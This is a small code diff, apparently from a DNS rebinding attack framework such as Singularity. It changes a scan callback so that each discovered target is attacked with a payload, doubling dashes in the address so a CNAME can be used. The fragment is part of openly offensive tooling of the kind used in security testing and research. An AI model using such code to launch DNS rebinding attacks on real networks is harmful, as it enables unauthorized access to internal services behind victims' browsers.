@@ -93,7 +93,9 @@
         function scanFoundNewTargetCb(result) {
             console.log(result);
             document.getElementById("activity").innerHTML += JSON.stringify(result, null, 4) + "<br/>";
-            app.attackTarget(result.target.address, result.target.port, payload)
+            // start DNS rebinding attack against target.
+            // we double encode dash "-" if we send a CNAME for singularity to exploit instead of an IP address.
+            app.attackTarget(result.target.address.replace("-", "--"), result.target.port, payload)
         }
 
         // scanDoneCb() is invoked when the scan was completed.
